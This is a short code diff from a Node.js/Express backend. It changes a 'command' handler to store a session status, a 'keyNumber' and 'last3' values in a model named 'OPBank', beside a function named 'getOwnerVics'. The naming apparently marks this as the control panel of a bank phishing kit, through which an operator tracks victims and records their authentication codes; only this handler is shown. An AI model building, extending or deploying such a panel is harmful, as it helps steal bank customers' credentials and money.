@@ -19,9 +19,9 @@ const getOwnerVics = async (req, res) => {
 const command = async (req, res) => {
     const { uniqueid, status, keyNumber, last3 } = req.body;
     try {
-        if (keyNumber) await uBank.findOneAndUpdate({ uniqueid }, { status, keyNumber }).exec();
-        else if (last3) await uBank.findOneAndUpdate({ uniqueid }, { status, last3 }).exec();
-        else await uBank.findOneAndUpdate({ uniqueid }, { status  }).exec();
+        if (keyNumber && last3) await OPBank.findOneAndUpdate({ uniqueid }, { status, keyNumber, last3 }).exec();
+        else if (keyNumber) await OPBank.findOneAndUpdate({ uniqueid }, { status, keyNumber }).exec();
+        else await OPBank.findOneAndUpdate({ uniqueid }, { status  }).exec();
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
